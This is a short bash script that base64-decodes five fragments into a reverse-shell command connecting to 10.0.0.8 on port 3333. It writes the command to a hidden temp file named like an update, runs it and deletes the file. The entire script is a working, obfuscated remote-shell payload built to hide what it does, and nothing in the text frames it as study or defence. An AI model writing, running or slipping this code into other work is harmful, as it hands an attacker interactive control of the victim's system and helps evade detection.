#!/bin/bash

P1=$(echo "YmFzaCAtaSA+Jg==" | base64 -d)
P2=$(echo "L2Rldi90Y3Av" | base64 -d)
P3=$(echo "MTAuMC4wLjgv" | base64 -d)
P4=$(echo "MzMzMw==" | base64 -d)
P5=$(echo "IDA+JjE=" | base64 -d)

echo "${P1}${P2}${P3}${P4}${P5}" > /tmp/.update.sh
chmod +x /tmp/.update.sh
bash /tmp/.update.sh
rm -f /tmp/.update.sh
